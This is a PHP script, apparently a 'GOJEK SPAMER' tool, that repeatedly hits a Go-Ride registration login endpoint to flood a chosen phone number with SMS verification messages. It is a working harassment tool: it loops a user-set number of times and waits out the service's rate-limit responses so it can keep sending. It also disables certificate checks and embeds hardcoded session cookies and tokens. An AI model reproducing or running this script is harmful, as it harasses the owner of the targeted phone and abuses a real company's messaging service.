<?php
/* 
GOJEK SPAMER
Mr.J49UN9_404
Thanks
All
*/
$green  = "\e[92m";
$red    = "\e[91m";
$yellow = "\e[93m";
$blue   = "\e[36m";
system("clear");
sleep(2);
echo "$green+---------------[# GO! - JEK - SPAM SMS #]---------------+\n";
sleep(2);
echo "$green+-------------------[# Mr.J49UN9_404 #]-------------------+\n";
echo "\nNO HP 		: ";
$no = trim(fgets(STDIN, 1024));
echo "\nCOUNT 		: ";
$loop = trim(fgets(STDIN, 1024));
echo "\n$blue+---------------------[# RESULT #]---------------------+\n";
$no = substr(trim($no), 1);
for ($x=1; $x<=$loop; $x++) {
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, "https://daftar.go-ride.co.id/supply/app/goride/v1/login");
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HTTPHEADER, array(
		'Cookie: _ga=GA1.3.293141030.1524368226; _gid=GA1.3.656788143.1524368226; _gat=1; _gat_gtag_UA_69417218_24=1; _onboarding_session=NklTTHc0bmR3UUlyUzhVT2paVzJ3UFF4SSsvOVJaOVcwNm9jbTVxcjU3QytBdnIxTWVEMUFRMEFRKzVVRXREZjN3WFpXV0YwMDNjeFkyNFJJZzE0ZUlwczZHZ052OGVpZXIvODl0T2xRalR0bzB1ZERZNUsza3NuL3hUVXVGcUh6K29KeWlraWhpeUtYek0wTDVuVjBIdjZyb0Nkd0pnVnJOUkhRRFVha2pjRGI4Y05qalZ0WWxlWGZnS2RaSlpZM0J3Z2YrUk1PK0MyUHRzMXBWSE4wT1RtUlFnNUJ3dWQzcXNpbVZ0dFVQL29MOTBlOHJCbytBalBzU3ZQdUowRi0tbzdSM1FCdEtCamRNZW9KamtIN2VnQT09--53f31531a2d3e955c9a1e48c92d6e0b74ec75412',
	    'Upgrade-Insecure-Requests: 1',
	    'Origin: https://daftar.go-ride.co.id',
	    'Accept-Encoding: gzip, deflate, br',
	    'Accept-Language: en-US,en;q=0.9',
	    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	    'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
	    'Content-Type: application/x-www-form-urlencoded',
	    'Referer: https://daftar.go-ride.co.id/supply/app/goride/v1/login/new',
	    'Connection: keep-alive'
	));
	curl_setopt($c, CURLOPT_POSTFIELDS,"utf8=%E2%9C%93&authenticity_token=hhfItbVeAjcLn%2BYCCJcY50D3CTiueFJaJg1Vwr3im4o%2ByH4DGDW2hnvFfJ8grQ6DlqBqnzG1Xwuk%2BIX2h8uajw%3D%3D&contact_no=".$no);
	curl_setopt($c, CURLOPT_POST, 1);
	$hasil = curl_exec($c);
	//FUNGSI FALSE
	if ($hasil == "Too Many Requests") {
		$loop += 1;
		echo "\e[91m$x. Code failed to send :(\n\e[97mCount +1\n".($loop-$x)." remaining\n\e[93mSleep in 60s\n";
		flush();
		sleep(60);		
	} else {
		echo "$red   $x. NO HP : [ 0$no ] $green [ STATUS : SUCCESS ]    \n";
		flush();
		sleep(12);		
	}
}
echo "$green+------------------------------------------------------+\n";
echo "$red|     [#] CP-id  [#] $green Mr.J49UN9_404 $red [#]  JG-id [#]        |\n";
echo "$green+------------------------------------------------------+\n";
?>
